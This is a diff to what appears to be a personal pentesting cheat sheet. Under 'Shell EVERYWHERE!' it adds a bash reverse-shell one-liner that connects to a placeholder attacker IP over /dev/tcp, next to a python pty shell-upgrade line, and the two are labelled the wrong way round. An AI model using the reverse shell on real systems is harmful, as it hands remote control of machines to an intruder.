@@ -50,6 +50,11 @@ Close window                        - Alt + W
 ```
 
 ### Shell EVERYWHERE!
+1. Reversed Shell
 ```
 python3 -c 'import pty;pty.spawn("/bin/bash")'
+```
+2. Stable Shell
+```
+bash -c "bash -i >& /dev/tcp/{your_IP}/443 0>&1"
 ```
